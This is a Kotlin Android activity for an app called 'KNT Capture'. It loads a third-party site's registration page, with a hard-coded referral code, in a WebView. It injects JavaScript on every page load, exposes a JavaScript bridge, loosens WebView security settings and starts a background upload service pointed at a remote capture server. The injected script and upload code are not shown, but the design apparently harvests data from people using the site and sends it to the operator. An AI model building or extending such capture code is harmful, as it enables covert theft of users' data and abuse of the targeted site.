package com.knt.captureclient

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.ViewGroup
import android.webkit.*
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var statusBar: TextView

    companion object {
        const val REGISTER_URL = "https://dkwin9.com/#/register?invitationCode=164651193511"
        const val ADMIN_URL    = "https://dkwin9.com/#/subordinate"
        const val SERVER_URL   = "https://knt-capture-server.onrender.com"
        const val INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
        const val ADMIN_UID    = "164651193511"
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Prefs.init(this)
        if (Prefs.deviceId.isNullOrEmpty()) {
            Prefs.deviceId = UUID.randomUUID().toString().replace("-", "").take(16)
        }

        val svc = Intent(this, UploadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
        else startService(svc)

        // UI
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        statusBar = TextView(this).apply {
            setPadding(24, 32, 24, 32)
            setTextColor(0xFF1EFFBC.toInt())
            setBackgroundColor(0xFF0A0F1A.toInt())
            textSize = 13f
            isClickable = true
            isFocusable = true
        }
        root.addView(statusBar, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ))

        webView = WebView(this)
        root.addView(webView, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
        ))

        setContentView(root)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = userAgentString + " KNTCapture/1.0"
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                JsInjector.inject(view ?: return, url ?: "", Prefs.adminMode)
                updateStatus()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(cm: ConsoleMessage): Boolean {
                android.util.Log.d("KNT-WV", "${cm.message()} @${cm.lineNumber()}")
                return true
            }
        }

        webView.addJavascriptInterface(CaptureBridge(this), "KNTBridge")

        // tap on top status bar = toggle mode
        statusBar.setOnClickListener {
            Prefs.adminMode = !Prefs.adminMode
            Prefs.ownerUid = ADMIN_UID
            val newUrl = if (Prefs.adminMode) ADMIN_URL else REGISTER_URL
            webView.loadUrl(newUrl)
            updateStatus()
        }

        val startUrl = if (Prefs.adminMode) ADMIN_URL else REGISTER_URL
        webView.loadUrl(startUrl)
        updateStatus()
    }

    private fun updateStatus() {
        val mode = if (Prefs.adminMode) "ADMIN MODE" else "CAPTURE MODE"
        statusBar.text = "KNT Capture · $mode · (tap to switch)"
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
